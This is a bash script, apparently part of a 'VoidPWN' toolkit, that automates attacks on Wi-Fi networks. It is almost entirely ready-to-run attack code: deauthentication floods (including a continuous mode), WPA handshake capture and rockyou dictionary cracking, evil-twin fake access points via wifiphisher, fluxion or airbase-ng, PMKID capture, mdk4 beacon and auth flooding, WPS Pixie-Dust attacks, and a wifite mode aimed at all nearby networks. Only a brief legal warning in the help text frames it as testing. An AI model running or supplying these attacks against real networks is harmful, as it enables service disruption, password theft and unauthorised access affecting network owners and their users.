#!/bin/bash

################################################################################
# VoidPWN - WiFi Attack Automation Script
# Description: Automated WiFi reconnaissance and attack tools
# Usage: ./wifi_tools.sh [options]
################################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
PROJECT_ROOT="$(dirname "$(dirname "$SCRIPT_DIR")")"
OUTPUT_DIR="$PROJECT_ROOT/output/captures"

# Find a usable wordlist — auto-decompress rockyou if needed
find_wordlist() {
    local rockyou="/usr/share/wordlists/rockyou.txt"
    local rockyou_gz="/usr/share/wordlists/rockyou.txt.gz"

    if [[ -f "$rockyou" ]]; then
        echo "$rockyou"
        return 0
    fi
    if [[ -f "$rockyou_gz" ]]; then
        log_warning "Decompressing rockyou.txt.gz..."
        gunzip -k "$rockyou_gz" && echo "$rockyou" && return 0
    fi
    # Search for any common wordlist
    local found
    found=$(find /usr/share/wordlists -name "*.txt" 2>/dev/null | head -n 1)
    if [[ -n "$found" ]]; then
        log_warning "rockyou.txt not found, using fallback: $found"
        echo "$found"
        return 0
    fi
    log_error "No wordlist found. Install wordlists: sudo apt install wordlists"
    return 1
}

WORDLIST=$(find_wordlist 2>/dev/null || echo "")

# Auto-detect wireless interface using iw (handles wlan*, wlp*, wlx* naming)
detect_interface() {
    # Prefer external adapters (not the first one, which is usually built-in)
    # Use iw dev which works regardless of interface naming convention
    local ifaces
    ifaces=$(iw dev 2>/dev/null | awk '/Interface/{print $2}')

    if [[ -z "$ifaces" ]]; then
        # Fallback to ip link for any wireless
        ifaces=$(ip link show 2>/dev/null | awk -F': ' '/^[0-9]+: wl/{print $2}')
    fi

    if [[ -z "$ifaces" ]]; then
        echo ""
        return 1
    fi

    # Prefer wlan1/external adapters (more likely to be the pentest adapter)
    local preferred
    preferred=$(echo "$ifaces" | grep -v '^wlan0$' | head -n 1)
    if [[ -n "$preferred" ]]; then
        echo "$preferred"
    else
        echo "$ifaces" | head -n 1
    fi
}

INTERFACE=$(detect_interface)
if [[ -z "$INTERFACE" ]]; then
    echo -e "${RED}[!] No wireless interface detected!${NC}"
    exit 1
fi

# Set monitor interface name (airmon-ng usually appends 'mon' or changes it)
MONITOR_INTERFACE="${INTERFACE}mon"
if [[ "$INTERFACE" == *"mon"* ]]; then
    MONITOR_INTERFACE="$INTERFACE"
fi

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Banner
print_banner() {
    echo -e "${CYAN}"
    cat << "EOF"
    ╦ ╦┬┌─┐┬  ┌┬┐┌─┐┌─┐┬  ┌─┐
    ║║║│├┤ │   │ │ ││ ││  └─┐
    ╚╩╝┴└  ┴   ┴ └─┘└─┘┴─┘└─┘
EOF
    echo -e "${NC}"
}

log_info() { echo -e "${BLUE}[*]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[✗]${NC} $1"; }

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        log_error "This script must be run as root (use sudo)"
        exit 1
    fi
}

# Kill interfering processes
kill_processes() {
    log_info "Killing interfering processes..."
    airmon-ng check kill > /dev/null 2>&1
    log_success "Processes killed"
}

# Enable monitor mode and return the resulting monitor interface name
enable_monitor_mode() {
    log_info "Enabling monitor mode on $INTERFACE..."

    # Check if interface exists
    if ! iw dev 2>/dev/null | grep -q "$INTERFACE"; then
        log_error "Interface $INTERFACE not found!"
        log_info "Available interfaces:"
        iw dev 2>/dev/null | awk '/Interface/{print "  " $2}'
        exit 1
    fi

    # Check if already in monitor mode
    if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
        log_success "Interface $INTERFACE is already in monitor mode"
        MONITOR_INTERFACE="$INTERFACE"
        return
    fi

    # Kill interfering processes first
    airmon-ng check kill > /dev/null 2>&1 || true

    # Enable monitor mode via airmon-ng and parse resulting interface name
    local airmon_out
    airmon_out=$(airmon-ng start "$INTERFACE" 2>&1)
    log_info "airmon-ng output: $airmon_out"

    # Detect the resulting monitor interface from airmon-ng output
    local mon_iface
    mon_iface=$(echo "$airmon_out" | grep -oP '(?<=monitor mode vif enabled for|monitor mode enabled on|enabled on )\S+' | tail -1)

    # Fallback: scan iw dev for any interface now in monitor mode
    if [[ -z "$mon_iface" ]]; then
        mon_iface=$(iw dev 2>/dev/null | awk 'BEGIN{iface=""} /Interface/{iface=$2} /type monitor/{print iface; exit}')
    fi

    if [[ -n "$mon_iface" ]]; then
        MONITOR_INTERFACE="$mon_iface"
        log_success "Monitor mode enabled on $MONITOR_INTERFACE"
    else
        # Brute-force fallback
        log_info "Attempting fallback method..."
        ip link set "$INTERFACE" down
        iw "$INTERFACE" set monitor none
        ip link set "$INTERFACE" up
        MONITOR_INTERFACE="$INTERFACE"
        if iw dev 2>/dev/null | awk "/Interface $INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
            log_success "Monitor mode enabled via fallback on $MONITOR_INTERFACE"
        else
            log_error "Failed to enable monitor mode on $INTERFACE"
            exit 1
        fi
    fi
}

# Disable monitor mode
disable_monitor_mode() {
    log_info "Disabling monitor mode..."
    airmon-ng stop "$MONITOR_INTERFACE" > /dev/null 2>&1
    systemctl restart NetworkManager
    log_success "Monitor mode disabled"
}

# Scan for networks (Headless for dashboard)
scan_networks() {
    local duration="${1:-15}"
    local output_file="${2:-$OUTPUT_DIR/scan_results}"
    
    enable_monitor_mode
    
    log_info "Scanning for WiFi networks for ${duration}s..."
    log_warning "Results will be saved to ${output_file}.csv"
    
    # Run airodump-ng for a limited time and exit
    sudo timeout "$duration" airodump-ng "$MONITOR_INTERFACE" -w "$output_file" --output-format csv
}

# Capture handshake
capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local essid="$3"
    
    if [[ -z "$bssid" ]] || [[ -z "$channel" ]]; then
        log_error "Usage: $0 --handshake <BSSID> <CHANNEL> [ESSID]"
        exit 1
    fi
    
    enable_monitor_mode
    
    local output_file="$OUTPUT_DIR/handshake_$(date +%Y%m%d_%H%M%S)"
    
    log_info "Switching $MONITOR_INTERFACE to channel $channel..."
    iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
    sleep 1

    log_info "Capturing handshake for $bssid on channel $channel"
    log_info "Output: $output_file"
    echo ""
    
    # Start capture in background
    airodump-ng -c "$channel" --bssid "$bssid" -w "$output_file" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    sleep 3
    
    # Send deauth packets (Aggressive Mode)
    log_info "Sending deauth packets..."
    aireplay-ng --deauth 10 -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
    
    sleep 2
    kill $airodump_pid 2>/dev/null
    
    log_success "Capture complete: $output_file"
    log_info "Crack with: aircrack-ng -w <wordlist> ${output_file}-01.cap"
}

# Automated attack with Wifite
auto_attack() {
    enable_monitor_mode
    
    log_info "Starting automated WiFi attack with Wifite..."
    log_warning "This will target all nearby networks"
    echo ""

    if ! iw dev 2>/dev/null | awk "/Interface $MONITOR_INTERFACE/{f=1} f && /type/{print; f=0}" | grep -q monitor; then
        log_error "Interface $MONITOR_INTERFACE is not in monitor mode. Run --monitor-on first."
        exit 1
    fi

    if [[ -z "$WORDLIST" ]]; then
        log_warning "No wordlist available. Running wifite without dictionary..."
        wifite --kill --wpa --no-wps -i "$MONITOR_INTERFACE"
    else
        wifite --kill \
               --dict "$WORDLIST" \
               --wpa \
               --no-wps \
               -i "$MONITOR_INTERFACE"
    fi
}

# Deauth attack
deauth_attack() {
    local bssid="$1"
    local count="${2:-0}"  # 0 = continuous
    local channel="$3"
    
    if [[ -z "$bssid" ]]; then
        log_error "Usage: $0 --deauth <BSSID> [COUNT] [CHANNEL]"
        exit 1
    fi
    
    enable_monitor_mode
    
    if [[ -n "$channel" ]]; then
        log_info "Switching $MONITOR_INTERFACE to channel $channel..."
        iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
        sleep 1
    fi
    
    log_info "Sending deauth packets to $bssid"
    if [[ "$count" -eq 0 ]]; then
        log_warning "Continuous mode - Press Ctrl+C to stop"
    fi
    echo ""
    
    # --ignore-negative-one fixes channel -1 issue
    aireplay-ng --deauth "$count" -a "$bssid" --ignore-negative-one "$MONITOR_INTERFACE"
}

# Evil Twin attack
evil_twin() {
    local ssid="$1"
    local channel="${2:-6}"
    
    if [[ -z "$ssid" ]]; then
        log_error "Usage: $0 --evil-twin <SSID> [CHANNEL]"
        exit 1
    fi
    
    log_info "Setting up Evil Twin attack for: $ssid"

    # Check for advanced tools first
    if command -v wifiphisher &> /dev/null; then
        log_info "Launching Wifiphisher for advanced Evil Twin attack..."
        # wifiphisher requires interactive mode usually, but we try to pass ESSID
        wifiphisher --essid "$ssid"
        return
    fi
    
    if [ -d "/opt/fluxion" ]; then
        log_info "Found Fluxion. Launching..."
        log_warning "Fluxion is interactive. Follow the on-screen prompts."
        cd /opt/fluxion && ./fluxion.sh
        return
    fi

    # Fallback to airbase-ng (Basic Soft AP)
    log_info "Advanced tools (wifiphisher/fluxion) not found."
    log_info "Starting Basic Evil Twin AP using airbase-ng..."
    
    enable_monitor_mode

    log_info "Switching $MONITOR_INTERFACE to channel $channel..."
    iw dev "$MONITOR_INTERFACE" set channel "$channel" 2>/dev/null || iwconfig "$MONITOR_INTERFACE" channel "$channel" 2>/dev/null || true
    sleep 1
    
    log_info "Broadcasting SSID: $ssid on channel $channel"
    log_warning "This creates a fake AP. Clients may connect, but won't have internet access"
    log_warning "without further IP checking/routing configuration."
    log_warning "Press Ctrl+C to stop"
    echo ""
    
    airbase-ng -e "$ssid" -c "$channel" "$MONITOR_INTERFACE"
}

# Crack captured handshake
crack_handshake() {
    local cap_file="$1"
    local wordlist="${2:-$WORDLIST}"
    
    if [[ -z "$cap_file" ]]; then
        log_error "Usage: $0 --crack <CAP_FILE> [WORDLIST]"
        exit 1
    fi
    
    if [[ ! -f "$cap_file" ]]; then
        log_error "File not found: $cap_file"
        exit 1
    fi

    if [[ -z "$wordlist" ]]; then
        wordlist=$(find_wordlist)
        if [[ $? -ne 0 ]]; then
            log_error "No wordlist available. Provide one with: $0 --crack <CAP_FILE> <WORDLIST>"
            exit 1
        fi
    fi
    
    log_info "Cracking handshake: $cap_file"
    log_info "Wordlist: $wordlist"
    echo ""
    
    aircrack-ng -w "$wordlist" "$cap_file"
}

# PMKID Attack (Clientless)
pmkid_capture() {
    local interface="$1"
    local duration="${2:-300}" # Default 5 mins
    
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    log_info "Starting PMKID capture on $interface for $duration seconds..."
    log_warning "No clients needed for this attack!"
    
    local output_pcapng="$OUTPUT_DIR/pmkid_$(date +%Y%m%d_%H%M%S).pcapng"
    
    # hcxdumptool for PMKID capture
    # -o: output file
    # -i: interface
    # --enable_status=1: show status
    timeout "$duration" hcxdumptool -o "$output_pcapng" -i "$interface" --enable_status=1
    
    if [[ -f "$output_pcapng" ]]; then
        log_success "Capture complete: $output_pcapng"
        log_info "Convert to hashcat format using: hcxpcapngtool -o hash.hc22000 $output_pcapng"
    else
        log_error "Capture failed or no data collected"
    fi
}

# MDK4 Beacon Flooding
mdk4_beacon_flood() {
    local interface="$1"
    local ssid_file="$2"
    
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    log_info "Starting MDK4 Beacon Flood on $interface..."
    if [[ -n "$ssid_file" ]]; then
        log_info "Using SSIDs from: $ssid_file"
        mdk4 "$interface" b -f "$ssid_file"
    else
        log_info "Generating random SSIDs..."
        mdk4 "$interface" b
    fi
}

# MDK4 Auth Flooding
mdk4_auth_flood() {
    local interface="$1"
    local bssid="$2"
    
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    if [[ -n "$bssid" ]]; then
        log_info "Starting MDK4 Auth Flood against $bssid on $interface..."
        mdk4 "$interface" a -a "$bssid"
    else
        log_info "Starting MDK4 Auth Flood against ALL APs on $interface..."
        mdk4 "$interface" a
    fi
}

# WPS Pixie-Dust Attack
wps_pixie_dust() {
    local bssid="$1"
    local interface="$2"
    
    if [[ -z "$bssid" ]]; then
        log_error "Usage: $0 --pixie <BSSID> [INTERFACE]"
        exit 1
    fi
    
    [[ -z "$interface" ]] && interface="$MONITOR_INTERFACE"
    
    log_info "Starting WPS Pixie-Dust attack against $bssid..."
    # -i: interface, -b: bssid, -K: pixie-dust, -vv: verbose
    reaver -i "$interface" -b "$bssid" -K 1 -vv
}

# Show help
show_help() {
    cat << EOF
${CYAN}VoidPWN WiFi Tools${NC}

${YELLOW}Usage:${NC}
  sudo $0 [OPTION]

${YELLOW}Options:${NC}
  --scan                    Scan for WiFi networks
  --handshake <BSSID> <CH>  Capture WPA handshake
  --auto-attack             Automated attack with Wifite
  --deauth <BSSID> [COUNT]  Deauth attack (0=continuous)
  --evil-twin <SSID> [CH]   Create Evil Twin AP (uses wifiphisher/fluxion if available)
  --crack <FILE> [DICT]     Crack captured handshake
  --pmkid [DUR]             Capture PMKID (clientless, default 300s)
  --beacon [FILE]           MDK4 Beacon Flood (optional SSID list)
  --auth [BSSID]            MDK4 Auth Flood (optional target BSSID)
  --pixie <BSSID>           WPS Pixie-Dust attack
  --monitor-on              Enable monitor mode
  --monitor-off             Disable monitor mode
  --help                    Show this help

${YELLOW}Examples:${NC}
  sudo $0 --scan
  sudo $0 --handshake AA:BB:CC:DD:EE:FF 6
  sudo $0 --auto-attack
  sudo $0 --deauth AA:BB:CC:DD:EE:FF 10
  sudo $0 --evil-twin "Free WiFi" 6
  sudo $0 --crack ~/captures/handshake-01.cap

${YELLOW}Output Directory:${NC}
  $OUTPUT_DIR

${RED}Legal Warning:${NC}
  Only test networks you own or have explicit permission to test.
  Unauthorized access is illegal.

EOF
}

# Main
main() {
    print_banner
    check_root
    
    case "$1" in
        --scan)
            scan_networks "$2" "$3"
            ;;
        --handshake)
            capture_handshake "$2" "$3" "$4"
            ;;
        --auto-attack)
            auto_attack
            ;;
        --deauth)
            deauth_attack "$2" "$3"
            ;;
        --evil-twin)
            evil_twin "$2" "$3"
            ;;
        --crack)
            crack_handshake "$2" "$3"
            ;;
        --pmkid)
            pmkid_capture "$MONITOR_INTERFACE" "$2"
            ;;
        --beacon)
            mdk4_beacon_flood "$MONITOR_INTERFACE" "$2"
            ;;
        --auth)
            mdk4_auth_flood "$MONITOR_INTERFACE" "$2"
            ;;
        --pixie)
            wps_pixie_dust "$2" "$MONITOR_INTERFACE"
            ;;
        --monitor-on)
            enable_monitor_mode
            ;;
        --monitor-off)
            disable_monitor_mode
            ;;
        --help|*)
            show_help
            ;;
    esac
}

# Cleanup on exit
trap 'log_warning "Interrupted"; disable_monitor_mode; exit 1' INT TERM

main "$@"
